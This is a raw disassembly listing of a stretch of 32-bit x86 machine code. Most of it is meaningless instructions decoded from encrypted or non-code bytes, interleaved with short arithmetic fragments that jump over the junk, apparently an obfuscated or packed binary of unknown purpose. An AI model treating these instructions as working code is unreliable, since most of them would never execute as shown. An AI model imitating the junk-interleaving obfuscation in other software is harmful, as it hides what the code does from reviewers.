  404a08:	mov    eax,ds:0x2e63da04
  404a0d:	ja     0x404a78
  404a0f:	push   cs
  404a10:	outs   dx,BYTE PTR ds:[esi]
  404a11:	into   
  404a12:	pop    edx
  404a13:	xor    BYTE PTR [eax],0x3e
  404a16:	icebp  
  404a17:	jne    0x404a7f
  404a19:	loopne 0x404a6f
  404a1b:	and    DWORD PTR [edi+0x5d],ebp
  404a1e:	lea    esi,[ecx+0xdaa5fd0]
  404a24:	cmc    
  404a25:	jb     0x4049f8
  404a27:	xor    ah,BYTE PTR [edi-0x3c]
  404a2a:	xchg   ecx,eax
  404a2b:	fmul   DWORD PTR [edi+0x35]
  404a2e:	add    DWORD PTR [edx-0x4d],0x1bccddce
  404a35:	sbb    DWORD PTR [eax+0x21],edi
  404a38:	add    bh,BYTE PTR [ebx+0x41ecbe48]
  404a3e:	add    esp,esp
  404a40:	ja     0x404ab6
  404a42:	leave  
  404a43:	pop    edi
  404a44:	sahf   
  404a45:	jle    0x404a36
  404a47:	out    0x48,eax
  404a49:	jmp    0xd544:0x5ff6a8b7
  404a50:	in     eax,dx
  404a51:	repnz ds icebp 
  404a54:	jp     0x404a2c
  404a56:	cs jecxz 0x4049ea
  404a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a5a:	test   eax,0xade68472
  404a5f:	jmp    edi
  404a61:	sbb    esi,DWORD PTR [esi]
  404a63:	add    eax,0x37e1471f
  404a68:	dec    eax
  404a69:	inc    esp
  404a6a:	dec    ecx
  404a6b:	push   esp
  404a6c:	xchg   edx,eax
  404a6d:	push   cs
  404a6e:	pushf  
  404a6f:	test   al,0x9b
  404a71:	int3   
  404a72:	hlt    
  404a73:	mov    esi,0xeb8447b2
  404a78:	in     eax,dx
  404a79:	inc    esp
  404a7a:	push   eax
  404a7b:	out    0xfe,al
  404a7d:	sbb    al,0x72
  404a7f:	leave  
  404a80:	ret    0x2ee1
  404a83:	rol    eax,cl
  404a85:	nop
  404a86:	fcmovb st,st(4)
  404a88:	mov    ebx,0x99b455b5
  404a8d:	retf   
  404a8e:	fmul   DWORD PTR [esi]
  404a90:	loop   0x404ad6
  404a92:	(bad)  
  404a93:	xchg   esp,eax
  404a94:	xor    bl,BYTE PTR [edi+0xb2aafd5]
  404a9a:	shr    BYTE PTR [ecx+0x7a38b186],cl
  404aa0:	jge    0x404af1
  404aa2:	rcr    DWORD PTR [esi-0x61b193e1],0xa7
  404aa9:	and    al,0x27
  404aab:	jmp    0x399e808f
  404ab0:	paddsw mm5,mm1
  404ab3:	push   0xffffff81
  404ab5:	sub    al,0xbd
  404ab7:	fwait
  404ab8:	aam    0x16
  404aba:	rcl    BYTE PTR [eax],1
  404abc:	jmp    0x1240c439
  404ac1:	jb     0x404a85
  404ac3:	and    eax,0xb8fe93ce
  404ac8:	into   
  404ac9:	mov    al,ds:0x5795fde0
  404ace:	or     eax,0xc03cb8f
  404ad3:	add    al,0x6c
  404ad5:	mov    ebx,0x7e8508e9
  404ada:	test   DWORD PTR [ecx],edx
  404adc:	mov    ebx,0x356aed4b
  404ae1:	push   ss
  404ae2:	inc    edx
  404ae3:	loopne 0x404aa2
  404ae5:	xchg   ebp,eax
  404ae6:	(bad)  
  404ae7:	xlat   BYTE PTR ds:[ebx]
  404ae8:	dec    esp
  404ae9:	ror    ah,0x3b
  404aec:	into   
  404aed:	xchg   edi,eax
  404aee:	stos   BYTE PTR es:[edi],al
  404aef:	fisubr WORD PTR [ebp-0x55600d68]
  404af5:	cmp    eax,0xfb5ceb6d
  404afa:	fdivr  st(2),st
  404afc:	pushf  
  404afd:	cwde   
  404afe:	call   0x224cffa2
  404b03:	dec    edx
  404b04:	sub    al,0x40
  404b06:	sbb    DWORD PTR [ebp+0x4f],esi
  404b09:	data16 or BYTE PTR [ebp+0x5d],dl
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	clc    
  404b0f:	jns    0x404aa4
  404b11:	iret   
  404b12:	or     DWORD PTR [ebx],0x69
  404b15:	pop    DWORD PTR [edx+ecx*1]
  404b18:	jge    0x404ad7
  404b1a:	mov    ah,0x9c
  404b1c:	adc    BYTE PTR [esi],ah
  404b1e:	pop    esp
  404b1f:	sub    ebp,DWORD PTR [edx+0x40073c3f]
  404b25:	sub    eax,0x7494d85d
  404b2a:	pop    ecx
  404b2b:	inc    eax
  404b2c:	imul   ebp,DWORD PTR [edx-0x49],0xffffff81
  404b30:	or     eax,0x6d1912a6
  404b35:	fs mov dh,0x12
  404b38:	sub    ah,BYTE PTR [ebx]
  404b3a:	icebp  
  404b3b:	loopne 0x404b83
  404b3d:	(bad)  
  404b3e:	jns    0x404b0d
  404b40:	pop    es
  404b41:	aad    0x3f
  404b43:	jb     0x404b54
  404b45:	(bad)  
  404b46:	adc    DWORD PTR [ecx+0x160238a1],ecx
  404b4c:	ins    BYTE PTR es:[edi],dx
  404b4d:	add    esi,DWORD PTR [ebp+esi*4+0x4f]
  404b51:	and    cl,BYTE PTR [edi-0x61ccb381]
  404b57:	aad    0xb5
  404b59:	lock sub edx,eax
  404b5c:	out    0x5b,eax
  404b5e:	retf   0x4f2a
  404b61:	dec    edi
  404b62:	inc    ebx
  404b63:	in     al,0x7b
  404b65:	mov    ah,0x38
  404b67:	dec    ebx
  404b68:	sub    eax,0xd5b4aec
  404b6d:	ja     0x404b55
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	ins    DWORD PTR es:[edi],dx
  404b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b9a:	jge    0x404bb6
  404b9c:	cs cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b66
  404ba5:	jmp    0x404b70
  404ba7:	and    ebp,esi
  404ba9:	xor    DWORD PTR [esi],esi
  404bab:	pop    ebx
  404bac:	pushw  ss
  404bae:	fidiv  WORD PTR [edx+0x162ac2d]
  404bb4:	mov    edx,0xe60c7acc
  404bb9:	hlt    
  404bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bbb:	call   0x4759:0xdaef17f7
  404bc2:	sbb    al,0xb9
  404bc4:	xchg   esp,eax
  404bc5:	rcl    DWORD PTR [ebx+0x2c],1
  404bc8:	sbb    ebx,ebp
  404bca:	dec    ebp
  404bcb:	cmp    BYTE PTR [edx+0x6f2a2867],dl
  404bd1:	rcr    BYTE PTR [eax+ebx*4],cl
  404bd4:	xor    al,0x6
  404bd6:	dec    ebp
  404bd7:	pop    esp
  404bd8:	je     0x404b5c
  404bda:	pop    esi
  404bdb:	fmul   QWORD PTR [edx+0x331ce5fb]
  404be1:	or     bl,al
  404be3:	hlt    
  404be4:	in     al,dx
  404be5:	test   DWORD PTR [esi+0x19],ebp
  404be8:	dec    eax
  404be9:	or     al,dh
  404beb:	lods   al,BYTE PTR ds:[esi]
  404bec:	sahf   
  404bed:	jne    0x404c44
  404bef:	add    DWORD PTR [esi+0x14],edx
  404bf2:	bound  esi,QWORD PTR [ecx]
  404bf4:	stos   BYTE PTR es:[edi],al
  404bf5:	enter  0xa82b,0xc1
  404bf9:	les    esi,FWORD PTR [esi]
  404bfb:	xchg   esp,eax
  404bfc:	sub    al,0xc5
  404bfe:	jl     0x404c31
  404c00:	loop   0x404c37
  404c02:	ret    0x3148
  404c05:	add    DWORD PTR [edi],ecx
  404c07:	cdq    
  404c08:	mov    al,ds:0xa14b98b
  404c0d:	mov    ebx,0xb712a3c2
  404c12:	into   
  404c13:	rol    DWORD PTR ds:0x84d68199,cl
  404c19:	xchg   esi,eax
  404c1a:	inc    edi
  404c1b:	cmp    al,BYTE PTR [bx-0x1f0b]
  404c20:	jp     0x404c01
  404c22:	call   0x2ac4dade
  404c27:	ret    0xef45
  404c2a:	or     al,0xe6
  404c2c:	outs   dx,BYTE PTR ds:[esi]
  404c2d:	je     0x404c1b
  404c2f:	(bad)  
  404c30:	xchg   ebx,eax
  404c31:	and    eax,0x5656d261
  404c36:	cvtps2pi mm1,QWORD PTR [ebx-0x19]
  404c3a:	fisubr WORD PTR [ecx]
  404c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c3d:	in     eax,dx
  404c3e:	sar    BYTE PTR [ecx],cl
  404c40:	scas   eax,DWORD PTR es:[edi]
  404c41:	mov    BYTE PTR [edx],bh
  404c43:	rol    DWORD PTR fs:[ecx+0x18],cl
  404c47:	ss call 0xd79ccca5
  404c4d:	mov    ch,0xd3
  404c4f:	daa    
  404c50:	push   cs
  404c51:	adc    al,0x79
  404c53:	fldenv [edx+edi*8+0x7433c7d]
  404c5a:	sub    al,0xd2
  404c5c:	add    DWORD PTR ds:0xb3c3db89,edx
  404c62:	fidiv  DWORD PTR [edi-0x28]
  404c65:	or     DWORD PTR [eax+0x47],0xffffff8e
  404c69:	shr    DWORD PTR [edx-0x62cbd809],1
  404c6f:	and    eax,0xf3322bcf
  404c74:	int3   
  404c75:	push   es
  404c76:	iret   
  404c77:	jmp    0x7b63:0xac56de48
  404c7e:	ficomp WORD PTR [edx]
  404c80:	inc    esi
  404c81:	adc    BYTE PTR [esi-0x33ce5ebc],cl
  404c87:	sub    BYTE PTR [edi-0x2a],ch
  404c8a:	cmp    DWORD PTR [edi],edi
  404c8c:	or     eax,0x68de99d2
  404c91:	ins    DWORD PTR es:[edi],dx
  404c92:	shl    BYTE PTR ds:[edx+0x6],1
  404c96:	jbe    0x404cda
  404c98:	frstor [edx]
  404c9a:	pop    ds
  404c9b:	mov    ebx,0x54e85d4b
  404ca0:	imul   edi,DWORD PTR [edi+eax*4+0x36],0xc1478af8
  404ca8:	ja     0x404c3f
  404caa:	inc    esp
  404cab:	jl     0x404c77
  404cad:	add    esp,DWORD PTR [eax-0x31]
  404cb0:	adc    ebx,ecx
  404cb2:	loop   0x404cd2
  404cb4:	test   DWORD PTR [ebx-0x1],0x80d47c03
  404cbb:	mov    dl,BYTE PTR [ebx]
  404cbd:	mov    al,0xe9
  404cbf:	xor    esp,DWORD PTR [edi*1-0x1b407664]
  404cc6:	push   ecx
  404cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc8:	sub    bh,al
  404cca:	outs   dx,DWORD PTR ds:[esi]
  404ccb:	aaa    
  404ccc:	std    
  404ccd:	jle    0x404d4d
  404ccf:	push   edi
  404cd0:	cmp    eax,DWORD PTR [esi+ecx*8+0x5b904fd]
  404cd7:	pop    ecx
  404cd8:	mov    eax,0x4621ae9f
  404cdd:	fst    QWORD PTR [esi]
  404cdf:	pop    ebx
  404ce0:	repz cmp BYTE PTR ds:0x8a05eaef,dh
  404ce7:	bound  ecx,QWORD PTR [edx]
  404ce9:	ficom  WORD PTR [eax]
  404ceb:	jnp    0x404c94
  404ced:	adc    eax,0x839f2e14
  404cf2:	stos   BYTE PTR es:[edi],al
  404cf3:	add    al,0xdc
  404cf5:	push   0xffffffa8
  404cf7:	mov    edi,0x997cf7b0
  404cfc:	test   eax,0x5ff18cac
  404d01:	shl    DWORD PTR [edi],0x6f
  404d04:	call   0x8a8b419a
  404d09:	push   ecx
  404d0a:	fst    st(0)
  404d0c:	dec    edx
  404d0d:	pop    esi
  404d0e:	push   esi
  404d0f:	mov    esp,0x6bc1e29a
  404d14:	pop    edi
  404d15:	sti    
  404d16:	jecxz  0x404d0f
  404d18:	dec    esp
  404d19:	je     0x404d2b
  404d1b:	test   eax,0xeb9baa59
  404d20:	pop    eax
  404d21:	adc    eax,0x9eac995e
  404d26:	inc    ecx
  404d27:	sub    eax,0x8fd1db4
  404d2c:	std    
  404d2d:	inc    edx
  404d2e:	shr    BYTE PTR [edx+esi*2-0x75],0x5d
  404d33:	in     al,0x88
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    dh,bl
  404d93:	xchg   esi,eax
  404d94:	rol    DWORD PTR [edx],1
  404d96:	mov    ebx,0x8b7e7e2f
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404d7e
  404d9f:	addr16 jmp 0xbe7b:0x8180cc3d
  404da7:	push   ebp
  404da8:	mov    ebx,0x2342244c
  404dad:	cmp    al,0x72
  404daf:	in     al,dx
  404db0:	mov    BYTE PTR [ecx],al
  404db2:	jo     0x404d4b
  404db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404db5:	retf   
  404db6:	iret   
  404db7:	out    0x2d,eax
  404db9:	shl    DWORD PTR ds:0x4ae45171,0x78
  404dc0:	mov    WORD PTR [edx-0x6c],?
  404dc3:	add    BYTE PTR [esi-0x20f651bf],al
  404dc9:	ja     0x404e32
  404dcb:	shl    DWORD PTR [ecx-0x2],1
  404dce:	xor    esi,DWORD PTR [edx+eiz*2-0x4f6cdc5c]
  404dd5:	mov    ebp,0xef2d51f1
  404dda:	lea    ecx,[eax]
  404ddc:	call   0xc4b:0x637b54f1
  404de3:	outs   dx,BYTE PTR ds:[esi]
  404de4:	loop   0x404e40
  404de6:	or     DWORD PTR [ecx+ecx*1-0x300d30b0],eax
  404ded:	rol    BYTE PTR [eax-0x75],0x15
  404df1:	push   ecx
  404df2:	stos   DWORD PTR es:[edi],eax
  404df3:	mov    dh,0xd2
  404df5:	stos   DWORD PTR es:[edi],eax
  404df6:	mov    ds:0x2c889014,eax
  404dfb:	stc    
  404dfc:	sub    edx,ebp
  404dfe:	fxch   st(3)
  404e00:	in     eax,dx
  404e01:	ins    BYTE PTR es:[edi],dx
  404e02:	push   es
  404e03:	dec    esi
  404e04:	adc    DWORD PTR [ebx],eax
  404e06:	sub    eax,0x3ccf92f
  404e0b:	nop
  404e0c:	or     al,0xc1
  404e0e:	push   cs
  404e0f:	fmul   st,st(7)
  404e11:	shr    bh,cl
  404e13:	push   ds
  404e14:	lahf   
  404e15:	push   0x53
  404e17:	aam    0x37
  404e19:	adc    DWORD PTR [ebx],esi
  404e1b:	ins    BYTE PTR es:[edi],dx
  404e1c:	or     ebx,DWORD PTR [eax+0x1c4f7404]
  404e22:	adc    eax,0x4286407d
  404e27:	mov    esp,0xbc7b1343
  404e2c:	and    ch,BYTE PTR [esi+0x78]
  404e2f:	dec    edi
  404e30:	cdq    
  404e31:	xor    al,0x82
  404e33:	outs   dx,BYTE PTR ds:[esi]
  404e34:	push   ss
  404e35:	pushf  
  404e36:	sahf   
  404e37:	ins    BYTE PTR es:[edi],dx
  404e38:	push   cs
  404e39:	xchg   esi,eax
  404e3a:	pop    esp
  404e3b:	add    BYTE PTR [ebp+0x29a57fc0],ah
  404e41:	xlat   BYTE PTR ds:[ebx]
  404e42:	lahf   
  404e43:	dec    esi
  404e44:	leave  
  404e45:	lods   al,BYTE PTR ds:[esi]
  404e46:	cld    
  404e47:	enter  0x150a,0x14
  404e4b:	and    al,0x77
  404e4d:	inc    ebp
  404e4e:	sbb    BYTE PTR [edi-0x5c],dl
  404e51:	push   0xffffffbb
  404e53:	mov    BYTE PTR [ebp+0x2d],bl
  404e56:	mov    al,ds:0x7618df0e
  404e5b:	cmp    eax,0x6a089b0e
  404e60:	and    DWORD PTR [esi+0x5d],edx
  404e63:	mov    bh,0x27
  404e65:	jbe    0x404ec2
  404e67:	xor    bh,BYTE PTR [edi]
  404e69:	dec    ecx
  404e6a:	cmp    al,0xe0
  404e6c:	call   0xb482:0x95faaa9b
  404e73:	loope  0x404ea7
  404e75:	jns    0x404e00
  404e77:	leave  
  404e78:	push   edx
  404e79:	adc    DWORD PTR [ebx],edx
  404e7b:	vaddsubps ymm6,ymm2,ymm5
  404e7f:	repnz ins BYTE PTR es:[edi],dx
  404e81:	test   BYTE PTR [ebx-0x76],ch
  404e84:	pop    ecx
  404e85:	jae    0x404e18
  404e87:	ds out 0x52,al
  404e8a:	sub    al,0xf7
  404e8c:	mov    ebp,0x18817488
  404e91:	sahf   
  404e92:	sbb    BYTE PTR [ebp-0x54b40791],bl
  404e98:	aam    0xcd
  404e9a:	outs   dx,DWORD PTR ds:[esi]
  404e9b:	mov    ds:0x94d39002,eax
  404ea0:	loope  0x404e3d
  404ea2:	xor    BYTE PTR [edx+ecx*1],0xe7
  404ea6:	and    esp,ecx
  404ea8:	pop    edi
  404ea9:	jo     0x404ef2
  404eab:	ret    
  404eac:	add    BYTE PTR [ebx],dl
  404eae:	mov    edx,0x99350d08
  404eb3:	fdiv   st,st(5)
  404eb5:	sbb    BYTE PTR [edi],al
  404eb7:	cs sub bh,cl
  404eba:	or     cl,cl
  404ebc:	sub    esi,DWORD PTR [esi-0x64]
  404ebf:	pop    ebp
  404ec0:	test   DWORD PTR [ebx],eax
  404ec2:	inc    esp
  404ec3:	xlat   BYTE PTR ds:[ebx]
  404ec4:	or     BYTE PTR [ebx],ch
  404ec6:	mov    ebx,0xff8de8ea
  404ecb:	pusha  
  404ecc:	cmp    al,0xf1
  404ece:	inc    esp
  404ecf:	cli    
  404ed0:	mov    edx,0xdbf689d0
  404ed5:	and    al,0x3b
  404ed7:	add    ah,al
  404ed9:	mov    ah,0x3a
  404edb:	inc    edx
  404edc:	inc    ecx
  404edd:	jp     0x404f0c
  404edf:	or     esp,eax
  404ee1:	dec    ebx
  404ee2:	stos   DWORD PTR es:[edi],eax
  404ee3:	mov    BYTE PTR [edx+0x249a0c09],al
  404ee9:	xchg   DWORD PTR [eax+ebp*4],eax
  404eec:	bound  ecx,QWORD PTR [ecx]
  404eee:	inc    edi
  404eef:	call   0x6775:0x1f37b5e5
  404ef6:	push   eax
  404ef7:	fst    DWORD PTR [edi+0x223cdbcf]
  404efd:	add    eax,0xe40b717e
  404f02:	mov    edi,ebp
  404f04:	sbb    al,0x6c
  404f06:	pmulhw mm0,QWORD PTR [ebp-0x45]
  404f0a:	jl     0x404f0f
  404f0c:	or     ecx,DWORD PTR [edi+0x60]
  404f0f:	mov    esi,eax
  404f11:	push   esp
  404f12:	rcr    DWORD PTR [edi],0x7d
  404f15:	ror    al,1
  404f17:	push   esp
  404f19:	fwait
  404f1a:	les    ebp,FWORD PTR [esi]
  404f1c:	cmp    esp,ebp
  404f1e:	sbb    al,0x32
  404f20:	repz lock fdivr st(3),st
  404f24:	push   eax
  404f25:	sbb    al,0x96
  404f27:	ret    0x7e2d
  404f2a:	mov    ?,WORD PTR [ebx]
  404f2c:	clc    
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x83d15a29
  404f44:	xchg   BYTE PTR [eax-0x37],bl
  404f47:	enter  0x7e21,0x7e
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f77
  404f50:	mov    bl,0x12
  404f52:	or     eax,0x7c6c4b02
  404f57:	outs   dx,DWORD PTR ds:[esi]
  404f58:	xor    al,0xa3
  404f5a:	jb     0x404f1d
  404f5c:	ret    
  404f5d:	retf   
  404f5e:	fs scas al,BYTE PTR es:[edi]
  404f60:	xchg   edx,eax
  404f61:	cmp    cl,BYTE PTR [edx]
  404f63:	cmp    DWORD PTR [esp+eax*8+0x3cb7cec4],edx
  404f6a:	cld    
  404f6b:	cwde   
  404f6c:	retf   0x7703
  404f6f:	ds aaa 
  404f71:	adc    ah,ah
  404f73:	cmp    DWORD PTR [ebx],0x26
  404f76:	aas    
  404f77:	sbb    ch,BYTE PTR [esi]
  404f79:	pop    ebx
  404f7a:	arpl   WORD PTR [edi],ax
  404f7c:	sbb    bl,BYTE PTR [ecx-0x488eeb00]
  404f82:	and    DWORD PTR [edi-0x18787088],0xe87f52cd
  404f8c:	inc    eax
  404f8d:	icebp  
  404f8e:	sbb    eax,0x3615af24
  404f93:	jns    0x404fce
  404f95:	xor    dh,bh
  404f97:	aaa    
  404f98:	(bad)  
  404f99:	mov    bh,0x26
  404f9b:	test   eax,0xff21ea08
  404fa0:	sbb    ebx,DWORD PTR [eax+0x4cfdb653]
  404fa6:	jmp    0x404f58
  404fa8:	adc    bh,ah
  404faa:	icebp  
  404fab:	sub    dh,BYTE PTR [ebp-0x7e25e3d3]
  404fb1:	ss test al,0x6e
  404fb4:	ficom  DWORD PTR [ebx+0x34487b7c]
  404fba:	cdq    
  404fbb:	addr16 inc ecx
  404fbd:	xor    al,0xbb
  404fbf:	adc    esi,DWORD PTR [ebp+0x3]
  404fc2:	lods   al,BYTE PTR ds:[esi]
  404fc3:	push   edi
  404fc4:	pop    eax
  404fc5:	loope  0x404f85
  404fc7:	cmp    DWORD PTR [eax*4-0x4760a8d2],ecx
  404fce:	pop    esi
  404fcf:	or     ah,bh
  404fd1:	or     DWORD PTR [eax+0x405d8547],ebx
  404fd7:	(bad)  
  404fd8:	(bad)  
  404fd9:	stos   DWORD PTR es:[edi],eax
  404fda:	xor    BYTE PTR [edi],al
  404fdc:	cmp    edi,DWORD PTR [ecx]
  404fde:	outs   dx,BYTE PTR ds:[esi]
  404fdf:	fimul  DWORD PTR [edx]
  404fe1:	fwait
  404fe2:	and    DWORD PTR [ebx+0x4d],ebp
  404fe5:	jge    0x404f9f
  404fe7:	cmp    eax,0x660338c3
  404fec:	push   ecx
  404fed:	sub    BYTE PTR [edx+0x56],dl
  404ff0:	mov    BYTE PTR [ecx+0x6b458fe4],dh
  404ff6:	xlat   BYTE PTR ds:[ebx]
  404ff7:	mov    esi,0x285bbe83
  404ffc:	dec    ebx
  404ffd:	out    0x7f,al
  404fff:	cdq    
  405000:	or     DWORD PTR [edx-0xe],ebx
  405003:	ror    ecx,0x3f
  405006:	xor    eax,0x58786f6c
  40500b:	leave  
  40500c:	sbb    al,0x87
  40500e:	retf   
  40500f:	jb     0x405010
  405011:	xchg   esi,eax
  405012:	dec    esp
  405013:	loopne 0x40504b
  405015:	lods   al,BYTE PTR ds:[esi]
  405016:	sub    eax,0x85d55071
  40501b:	aam    0x68
  40501d:	xchg   esp,eax
  40501e:	push   esi
  40501f:	test   eax,0xb0904dc1
  405024:	sbb    esi,esp
  405026:	clc    
  405027:	jae    0x405032
  405029:	cmc    
  40502a:	sar    DWORD PTR [eax+0x7ca42110],1
  405030:	mov    cl,0x18
  405032:	fwait
  405033:	xor    ebp,DWORD PTR [esi-0x9b8546a]
  405039:	aaa    
  40503a:	leave  
  40503b:	mov    ds:0x964866f5,al
  405040:	and    eax,0x6dbf6d94
  405045:	out    dx,al
  405046:	mov    esi,0x6fa601fb
  40504b:	xchg   esi,eax
  40504c:	mov    ebp,0xf8ee2a50
  405051:	add    esp,eax
  405053:	stos   BYTE PTR es:[edi],al
  405054:	mov    ecx,0xcad49980
  405059:	lods   eax,DWORD PTR ds:[esi]
  40505a:	xor    al,0xa2
  40505c:	sub    DWORD PTR [ecx],ebp
  40505e:	lods   eax,DWORD PTR ds:[esi]
  40505f:	hlt    
  405060:	repnz xchg ecx,edx
  405063:	mov    ebp,0xffed6611
  405068:	fmul   st(7),st
  40506a:	mov    ch,0xb9
  40506c:	cmp    esp,esi
  40506e:	nop
  40506f:	dec    ebx
  405070:	js     0x405014
  405072:	call   0x6771a30a
  405077:	inc    ecx
  405078:	cwde   
  405079:	(bad)  
  40507b:	(bad)  
  40507e:	inc    edx
  40507f:	sti    
  405080:	arpl   bx,ax
  405082:	rol    DWORD PTR [ebp+0x49],cl
  405085:	cld    
  405086:	jle    0x40504b
  405088:	cmp    eax,0x6da9b0cb
  40508d:	lahf   
  40508e:	xchg   esi,eax
  40508f:	scas   eax,DWORD PTR es:[edi]
  405090:	imul   esp,eax,0x5fde0490
  405096:	sub    al,BYTE PTR [eax+0x2b]
  405099:	pop    eax
  40509a:	sub    al,0xf7
  40509c:	je     0x4050fa
  40509e:	push   edi
  40509f:	retf   
  4050a0:	mov    ebx,DWORD PTR ds:0xa0313eb5
  4050a6:	and    BYTE PTR [ecx+0x3c],cl
  4050a9:	aam    0x1e
  4050ab:	mov    cs,WORD PTR [edi+0x14]
  4050ae:	sti    
  4050af:	stos   BYTE PTR es:[edi],al
  4050b0:	out    dx,eax
  4050b1:	adc    bh,dl
  4050b3:	mov    BYTE PTR [esi],bh
  4050b5:	jns    0x40510b
  4050b7:	aad    0x1f
  4050b9:	iret   
  4050ba:	cwde   
  4050bb:	push   ss
  4050bc:	sbb    esp,0xb9231de
  4050c2:	mov    ecx,0xa9f25baf
  4050c7:	imul   ebx,DWORD PTR [edi-0x6bfd4e52],0xe40e88f
  4050d1:	jae    0x40513e
  4050d3:	sub    al,0xf2
  4050d5:	cmp    dh,ah
  4050d7:	shl    DWORD PTR [ecx-0x74ad56ac],1
  4050dd:	pop    ebp
  4050de:	call   0xd16c2916
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	dec    eax
  40510e:	ja     0x4050c6
  405110:	xor    al,BYTE PTR [ebp+0x22]
  405113:	jle    0x405193
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405154
  40511a:	icebp  
  40511b:	add    dh,bl
  40511d:	xor    al,0x2f
  40511f:	xor    al,0x5f
  405121:	scas   eax,DWORD PTR es:[edi]
  405122:	jo     0x405143
  405124:	test   BYTE PTR gs:[ebp+edi*2+0x2d9d8fce],ah
  40512c:	pop    edx
  40512d:	nop
  40512e:	pop    ebp
  40512f:	inc    ebx
  405130:	ins    BYTE PTR es:[edi],dx
  405131:	or     al,0x7b
  405133:	outs   dx,DWORD PTR ds:[esi]
  405134:	push   ecx
  405135:	pop    ebp
  405136:	imul   ecx,esi,0xffffff92
  405139:	dec    ebp
  40513a:	mov    DWORD PTR [esi],ebp
  40513c:	retf   0xafad
  40513f:	(bad)  
  405140:	lods   al,BYTE PTR ds:[esi]
  405141:	loope  0x40511f
  405143:	cmp    DWORD PTR [edx],edi
  405145:	pop    ebx
  405146:	fld    DWORD PTR [edi+0x5c416f0d]
  40514c:	pop    esp
  40514d:	fist   DWORD PTR [edi]
  40514f:	call   0xe5c996b
  405154:	push   es
  405155:	in     eax,0x22
  405157:	into   
  405158:	jnp    0x405146
  40515a:	pop    ebx
  40515b:	and    BYTE PTR [edi],ch
  40515d:	int3   
  40515e:	repnz or edi,DWORD PTR [ebx]
  405161:	push   ecx
  405162:	ins    BYTE PTR es:[edi],dx
  405163:	adc    ah,BYTE PTR [ecx+esi*4-0x262f0339]
  40516a:	xchg   ecx,eax
  40516b:	mov    edx,0xc4d14958
  405170:	(bad)  
  405171:	aad    0x4f
  405173:	ja     0x405138
  405175:	icebp  
  405176:	repnz dec esp
  405178:	xor    eax,0x58282b44
  40517d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40517e:	stos   BYTE PTR es:[edi],al
  40517f:	mov    dh,0x71
  405181:	push   gs
  405183:	mov    bl,0xd
  405185:	fstp   DWORD PTR [esi]
  405187:	sbb    eax,0x4ded5ce9
  40518c:	not    BYTE PTR [esi]
  40518e:	test   DWORD PTR [edx],eax
  405190:	xchg   ecx,eax
  405191:	sbb    al,0xac
  405193:	xchg   esi,eax
  405194:	mov    bh,BYTE PTR [edx+0x32]
  405197:	outs   dx,BYTE PTR ds:[esi]
  405198:	int    0x3f
  40519a:	xlat   BYTE PTR ds:[ebx]
  40519b:	sbb    bl,BYTE PTR [edx+0x2b6ad52d]
  4051a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051a2:	(bad)  
  4051a3:	sbb    edx,DWORD PTR [edi+0x2f1f46ae]
  4051a9:	sbb    eax,0xa275b3af
  4051ae:	jo     0x4051cf
